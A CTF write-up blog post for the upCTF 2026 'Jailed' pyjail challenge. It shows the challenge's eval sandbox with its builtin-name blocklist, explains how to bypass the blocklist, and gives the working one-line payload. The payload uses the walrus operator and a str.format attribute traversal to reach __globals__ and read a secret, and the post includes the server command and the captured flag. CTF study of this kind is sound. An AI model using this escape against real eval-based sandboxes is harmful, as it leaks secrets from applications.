---
layout: post
title:  "Jailed"
date:   2026-03-09 17:43:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /upCTF-2026-Jailed/
---

**Title**: Jailed

**Category**: misc

**Author**: cdm

**Description**: yes it is a pyjail, yes it is cool, yes it isn't too hard.

I get the challenge file `chall.py`:
```python
import os
API_KEY = os.getenv("FLAG")

class cdm22b:
    def __init__(self):
        self.SAFE_GLOBALS = locals()
        self.SAFE_GLOBALS['__builtins__'] = {}
        self.name = "cdm"
        self.role = "global hacker, hacks planets"
        self.friend = "No one"

    def validateInput(self, input: str) -> tuple[bool, str]:
        if len(input) > 66:
            return False, 'to long, find a shorter way'

        for builtin in dir(__builtins__):
            if builtin.lower() in input.lower():
                return False, 'builtins would be too easy!'

        if any(i in input for i in '\",;`'):
            return False, 'bad bad bad chars!'

        return True, ''


    def safeEval(self, s):
        try:
            eval(s, self.SAFE_GLOBALS)
        except Exception:
            print("Something went wrong")


    def myFriend(self):
        friend = self.SAFE_GLOBALS.get('friend', self.friend)
        print(friend.format(self=self))


if __name__ == '__main__':
    hacker = cdm22b()
    input = input()
    ok, err = hacker.validateInput(input)
    if ok:
        hacker.safeEval(input)
        hacker.myFriend()
    else:
        print(err)
```

`myFriend()` does:
```python
friend = self.SAFE_GLOBALS.get('friend', self.friend)
print(friend.format(self=self))
```
If we can get a malicious format string into `SAFE_GLOBALS` under the key `'friend'` Pythons format engine will evaluate `{self.<anything>}` with full attribute traversal including `__globals__`.

1. Walrus operator (`:=`) is an expression (works in `eval`) and assigns into `SAFE_GLOBALS` (since eval uses it as both globals+locals) 
2. `"globals"` is a blocked builtin name but `self.role = "global hacker, hacks planets"` contains `"global"` at `[:6]`
3. We can build the forbidden string by concatenation so `"globals"` never appears in our raw input

Solution:
```shell
nc 46.225.117.62 30010  
(friend:='{self.myFriend.__'+self.role[:6]+'s__[API_KEY]}')  
upCTF{fmt_str1ng5_4r3nt_0nly_a_C_th1ng-9Wfy2gx009522418}
```

`upCTF{fmt_str1ng5_4r3nt_0nly_a_C_th1ng-9Wfy2gx009522418}`